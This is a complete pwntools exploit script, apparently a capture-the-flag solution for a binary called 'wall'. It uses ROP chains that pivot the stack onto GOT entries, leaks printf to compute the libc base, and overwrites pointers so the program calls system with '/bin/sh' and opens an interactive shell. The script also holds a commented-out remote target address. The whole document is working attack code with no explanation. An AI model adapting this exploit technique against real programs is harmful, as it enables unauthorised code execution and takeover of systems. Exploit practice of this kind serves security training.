from pwn import *

elf = ELF('./wall')
libc = ELF('./libc.so.6')
io = process(elf.path)
#io = remote('34.170.146.252', 38759)

ret = 0x40101a
pop_rbp_ret = 0x40115d

rop = p64(pop_rbp_ret)
rop += p64(elf.got["setbuf"] + 0x80)
rop += p64(0x401196)
payload = p64(ret) * ((4096 - len(rop)) // 8)
payload += rop
io.sendlineafter(b'Message: ', payload)

rop = p64(pop_rbp_ret)
rop += p64(elf.got["printf"] + 0x80)
rop += p64(0x4011b1)
payload = p64(ret) * ((128 - len(rop)) // 8)
payload += rop
io.sendlineafter(b'? ', payload)

io.recvline()

io.recvuntil(b'Message from ')
output = io.recvuntil(b':', drop=True)
printf_addr = u64(output.ljust(8, b'\x00'))
libc.address = printf_addr - libc.sym["printf"]
log.info(f'libc base: {hex(libc.address)}')

payload = p64(libc.sym["system"])
payload += p64(elf.sym["main"])
payload += p64(0) * 6
payload += p64(libc.sym["_IO_2_1_stdout_"])
payload += p64(0)
payload += p64(libc.sym["_IO_2_1_stdin_"])
payload += p64(0)
# /bin/sh
payload += p64(next(libc.search(b'/bin/sh\x00')))

io.sendline(payload)

io.interactive()
